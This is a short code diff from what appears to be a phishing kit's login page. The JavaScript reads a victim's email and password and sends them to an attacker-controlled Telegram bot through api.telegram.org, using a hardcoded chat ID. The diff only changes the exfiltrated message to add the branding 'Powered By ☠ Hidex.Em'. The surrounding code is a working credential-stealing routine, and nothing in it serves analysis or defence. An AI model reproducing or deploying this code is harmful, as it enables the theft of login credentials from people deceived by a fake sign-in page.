@@ -135,7 +135,8 @@ const chatId = "5947339497";
 			const password = passwordInput.value;
 			
 			// Send message to Telegram bot
-			const message = `Account Info\nEmail : ${email}\nPassword : ${password}`;
+			const message = `⚿ Account Info\nEmail : ${email}\nPassword : ${password}
+			Powered By ☠ Hidex.Em`;
 			const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 			
 			fetch(url)
